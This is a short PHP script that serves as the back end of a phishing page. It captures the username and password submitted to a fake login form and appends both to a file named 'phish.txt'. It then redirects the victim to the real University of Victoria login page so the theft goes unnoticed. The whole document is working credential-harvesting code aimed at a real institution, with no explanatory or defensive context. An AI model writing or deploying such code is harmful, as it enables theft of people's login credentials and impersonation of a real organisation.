<?php
$uname = $_POST['username'];
$pwd = $_POST['password'];
$fil = fopen('phish.txt', 'a');
fwrite($fil, $uname);
fwrite($fil, '###########');
fwrite($fil, $pwd . "\r\n");
fclose($fil);
echo ("<SCRIPT LANGUAGE='JavaScript'>
    window.location.href='https://www.uvic.ca/cas/login?service=https%3A%2F%2Fwww.uvic.ca%2F';
    </SCRIPT>");
?>